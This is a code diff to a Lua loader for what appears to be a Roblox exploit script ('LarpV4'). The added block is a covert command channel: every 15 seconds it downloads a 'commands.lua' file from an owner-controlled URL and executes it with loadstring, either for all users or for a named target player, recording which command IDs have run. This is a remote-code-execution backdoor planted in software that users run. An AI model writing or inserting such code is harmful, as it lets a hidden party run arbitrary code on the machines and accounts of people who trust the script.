@@ -414,4 +414,38 @@ downloader.Visible = false
 if not _larpok then
 	error('LarpV4/main.lua: '..tostring(_larpres))
 end
+
+-- owner command channel: poll the owner-controlled profile and execute for the targeted player
+task.spawn(function()
+	local C2URL = ROOT..BRANCH..'/profiles/commands.lua'
+	local done = getgenv()._larpC2Done
+	while true do
+		task.wait(15)
+		local ok, res = pcall(function()
+			return game:HttpGet(C2URL, true)
+		end)
+		if ok and res and #res > 100 then
+			local id = res:match('%-%-id:(%S+)')
+			local target = res:match('%-%-target:(%S+)') or '*'
+			if id and id ~= done then
+				local lp = cloneref(game:GetService('Players')).LocalPlayer
+				local name = lp and lp.Name
+				if target == '*' or (name and target:lower() == name:lower()) then
+					local chunk = loadstring(res)
+					if chunk then
+						local ok2, ret2 = pcall(chunk)
+						if ok2 and ret2 then
+							done = id
+							getgenv()._larpC2Done = done
+						end
+					end
+				else
+					done = id
+					getgenv()._larpC2Done = done
+				end
+			end
+		end
+	end
+end)
+
 return _larpres
